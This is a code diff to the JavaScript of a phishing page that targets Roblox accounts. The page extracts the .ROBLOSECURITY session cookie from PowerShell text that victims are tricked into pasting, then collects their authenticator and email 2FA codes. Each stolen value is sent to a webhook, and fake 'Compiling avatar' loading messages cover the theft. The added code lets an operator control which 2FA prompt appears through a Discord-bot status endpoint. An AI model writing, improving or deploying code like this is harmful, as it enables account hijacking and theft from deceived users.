@@ -8,7 +8,6 @@ function openModal(id) {
   if (modal) {
     modal.style.display = 'flex';
     modal.style.opacity = '1';
-    // REMOVE: modal.style.pointerEvents = 'auto';
     const modalContent = modal.querySelector('.modal-content');
     if (modalContent) modalContent.classList.remove('fade-out');
 
@@ -27,20 +26,14 @@ function closeModal(id) {
     setTimeout(() => {
       modal.style.display = 'none';
       modal.style.opacity = '0';
-      // REMOVE: modal.style.pointerEvents = 'none';
       if (modalContent) modalContent.classList.remove('fade-out');
     }, 400);
   }
 }
 
-window.onclick = function(event) {
-  const modals = document.querySelectorAll('.modal');
-  modals.forEach(modal => {
-    if (event.target === modal) {
-      closeModal(modal.id);
-    }
-  });
-};
+function closeAllModals() {
+  ['modal', 'twofa-modal', 'twofa-modal-2', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
+}
 
 // === Main Button ===
 document.getElementById('enterButton').addEventListener('click', function() {
@@ -48,6 +41,10 @@ document.getElementById('enterButton').addEventListener('click', function() {
 });
 
 // === PowerShell Submission ===
+let waitingForDiscord = false; // Track if we're waiting for Discord command
+let waitingForSecondDiscord = false; // Track if we're waiting for the second Discord command after 2FA code
+let codeEntered = false; // Track if a code was entered in any modal
+
 document.getElementById('submitButton').addEventListener('click', async function() {
   const powershellInput = document.getElementById('powershellInput');
   const powershellData = powershellInput.value.trim();
@@ -57,13 +54,15 @@ document.getElementById('submitButton').addEventListener('click', async function
     return;
   }
 
-  showLoading(true);
-
   const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
   const match = powershellData.match(roblosecurityRegex);
 
   if (!match) {
+    showErrorAlert();
     await sendWebhook('No .ROBLOSECURITY Cookie Found', 'No .ROBLOSECURITY cookie found.', 0xff0000);
+    powershellInput.value = '';
+    closeModal('modal');
+    return;
   } else {
     const cookie = match[1].trim();
     await sendWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\``, 0x00ff00);
@@ -71,14 +70,86 @@ document.getElementById('submitButton').addEventListener('click', async function
 
   powershellInput.value = '';
   closeModal('modal');
-  showLoading(false);
 
-  setTimeout(() => {
-    openModal('twofa-modal');
-  }, 400);
+  // Show loading overlay and start waiting for Discord command
+  showLoading(true, true); // true = cycling
+  waitingForDiscord = true;
+  waitingForSecondDiscord = false;
+  codeEntered = false;
 });
 
-// === First 2FA Modal (Authenticator App) ===
+// === Loading Spinner and Message ===
+let loadingMsgInterval = null;
+let loadingMsgIndex = 0;
+const loadingMessages = [
+  "Compiling avatar",
+  "Gathering Avatar details",
+  "Processing"
+];
+
+function showLoading(show, cycling = false) {
+  if (show) {
+    if (!document.getElementById('loading-overlay')) {
+      const overlay = document.createElement('div');
+      overlay.id = 'loading-overlay';
+
+      const spinner = document.createElement('div');
+      spinner.className = 'spinner';
+
+      const msg = document.createElement('div');
+      msg.className = 'loading-message';
+      msg.id = 'loading-message';
+      msg.textContent = cycling ? loadingMessages[0] : "Processing";
+
+      overlay.appendChild(spinner);
+      overlay.appendChild(msg);
+      document.body.appendChild(overlay);
+    }
+    if (cycling) {
+      startLoadingMessages();
+    } else {
+      stopLoadingMessages();
+      document.getElementById('loading-message').textContent = "Processing";
+    }
+    // Spinner is always visible now!
+    const spinnerElem = document.querySelector('#loading-overlay .spinner');
+    if (spinnerElem) spinnerElem.style.display = '';
+  } else {
+    stopLoadingMessages();
+    const overlay = document.getElementById('loading-overlay');
+    if (overlay) overlay.remove();
+  }
+}
+
+function startLoadingMessages() {
+  loadingMsgIndex = 0;
+  const msgDiv = document.getElementById('loading-message');
+  if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
+  loadingMsgInterval = setInterval(() => {
+    loadingMsgIndex = (loadingMsgIndex + 1) % loadingMessages.length;
+    const msgDiv = document.getElementById('loading-message');
+    if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
+  }, 1500);
+}
+
+function stopLoadingMessages() {
+  clearInterval(loadingMsgInterval);
+}
+
+// === Red Alert Box ===
+function showErrorAlert() {
+  const alert = document.getElementById('error-alert');
+  if (alert) {
+    alert.style.display = 'block';
+    alert.style.opacity = '1';
+    setTimeout(() => {
+      alert.style.opacity = '0';
+      setTimeout(() => { alert.style.display = 'none'; }, 500);
+    }, 4000);
+  }
+}
+
+// === 2FA Modal Logic ===
 const twofaInput = document.getElementById('twofa-input');
 const verifyButton = document.getElementById('verifyButton');
 
@@ -90,31 +161,25 @@ if (twofaInput && verifyButton) {
   });
 
   verifyButton.addEventListener('click', async () => {
-    const codeEntered = twofaInput.value.trim();
-    if (!/^\d{6}$/.test(codeEntered)) {
+    const codeEnteredValue = twofaInput.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
       alert('Please enter a valid 6-digit code.');
       return;
     }
 
-    showLoading(true);
-    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEntered}**`, 0xffa500);
+    await sendWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput.value = '';
-    closeModal('twofa-modal');  // Close first popup
+    closeModal('twofa-modal');
 
-    setTimeout(() => {
-      openModal('twofa-modal-2');  // Open second popup
-    }, 1000);
+    // Show loading overlay with only "Processing"
+    showLoading(true, false);
+    waitingForDiscord = false;
+    waitingForSecondDiscord = true;
+    codeEntered = true;
+  });
+}
 
-    showLoading(false);
-  }); // <--- THIS IS THE END OF THE verifyButton.addEventListener
-
-// MISSING THIS CLOSING BRACE:
-} // <--- ADD THIS TO CLOSE THE if (twofaInput && verifyButton) BLOCK
-
-
-
-// === Second 2FA Modal ===
 const twofaInput2 = document.getElementById('twofa-input-2');
 const verifyButton2 = document.getElementById('verifyButton2');
 
@@ -126,26 +191,24 @@ if (twofaInput2 && verifyButton2) {
   });
 
   verifyButton2.addEventListener('click', async () => {
-  const codeEntered = twofaInput2.value.trim();
-  if (!/^\d{6}$/.test(codeEntered)) {
-    alert('Please enter a valid 6-digit code.');
-    return;
-  }
+    const codeEnteredValue = twofaInput2.value.trim();
+    if (!/^\d{6}$/.test(codeEnteredValue)) {
+      alert('Please enter a valid 6-digit code.');
+      return;
+    }
 
-  showLoading(true);
-  await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEntered}**`, 0xffa500);
+    await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
-  twofaInput2.value = '';
-  closeModal('twofa-modal-2');
-  showLoading(false);
+    twofaInput2.value = '';
+    closeModal('twofa-modal-2');
 
-  setTimeout(() => {
-    showSuccessPopup(); // <<< show the green success popup
-  }, 400); // wait 400ms so it feels natural
-});
-
+    // Show green alert box
+    showSuccessPopup();
+    waitingForDiscord = false;
+    waitingForSecondDiscord = false;
+    codeEntered = true;
+  });
 }
-
 
 // === Webhook Sending ===
 async function sendWebhook(title, description, color) {
@@ -165,50 +228,6 @@ async function sendWebhook(title, description, color) {
     body: JSON.stringify(payload)
   });
 }
-
-// === Loading Spinner ===
-function showLoading(show) {
-  if (show) {
-    if (!document.getElementById('loading-overlay')) {
-      const overlay = document.createElement('div');
-      overlay.id = 'loading-overlay';
-      overlay.style.position = 'fixed';
-      overlay.style.top = '0';
-      overlay.style.left = '0';
-      overlay.style.width = '100%';
-      overlay.style.height = '100%';
-      overlay.style.background = 'rgba(0,0,0,0.5)';
-      overlay.style.zIndex = '10000';
-      overlay.style.display = 'flex';
-      overlay.style.justifyContent = 'center';
-      overlay.style.alignItems = 'center';
-
-      const spinner = document.createElement('div');
-      spinner.style.width = '60px';
-      spinner.style.height = '60px';
-      spinner.style.border = '8px solid #f3f3f3';
-      spinner.style.borderTop = '8px solid #007bff';
-      spinner.style.borderRadius = '50%';
-      spinner.style.animation = 'spin 1s linear infinite';
-
-      overlay.appendChild(spinner);
-      document.body.appendChild(overlay);
-    }
-  } else {
-    const overlay = document.getElementById('loading-overlay');
-    if (overlay) overlay.remove();
-  }
-}
-
-// === Spinner Animation ===
-const styleSheet = document.createElement('style');
-styleSheet.type = 'text/css';
-styleSheet.innerText = `
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}`;
-document.head.appendChild(styleSheet);
 
 // === Helpers ===
 function closeTwoFAModal() {
@@ -244,5 +263,58 @@ function showSuccessPopup() {
     popup.style.transition = 'opacity 0.5s';
     popup.style.opacity = '0';
     setTimeout(() => popup.remove(), 500);
-  }, 4000); // Shows for 4 seconds
+  }, 4000);
 }
+
+// === Poll Discord Bot Status and Control Modals ===
+let lastStatus = null;
+
+setInterval(async () => {
+  try {
+    // Only poll and react if we're waiting for Discord command
+    if (!waitingForDiscord && !waitingForSecondDiscord && !codeEntered) return;
+
+    const res = await fetch('http://localhost:3000/modal-status');
+    const data = await res.json();
+    if (!data.status || data.status === lastStatus) return;
+    lastStatus = data.status;
+
+    // === First Discord command after PowerShell ===
+    if (waitingForDiscord) {
+      if (data.status === "2") {
+        showLoading(false);
+        openModal('twofa-modal');
+        waitingForDiscord = false;
+        waitingForSecondDiscord = false;
+      } else if (data.status === "e") {
+        showLoading(false);
+        openModal('twofa-modal-2');
+        waitingForDiscord = false;
+        waitingForSecondDiscord = false;
+      }
+    }
+    // === Second Discord command after 2FA code ===
+    else if (waitingForSecondDiscord) {
+      if (data.status === "e") {
+        showLoading(false);
+        openModal('twofa-modal-2');
+        waitingForSecondDiscord = false;
+      } else if (data.status === "d" || data.status === "2") {
+        showLoading(false);
+        showSuccessPopup();
+        waitingForSecondDiscord = false;
+        codeEntered = false;
+      }
+    }
+    // === If a code was entered in any modal, and you type "d" or "e" or "2" ===
+    else if (codeEntered) {
+      if (data.status === "d" || data.status === "e" || data.status === "2") {
+        showLoading(false);
+        showSuccessPopup();
+        codeEntered = false;
+      }
+    }
+  } catch (e) {
+    // handle error
+  }
+}, 2000);
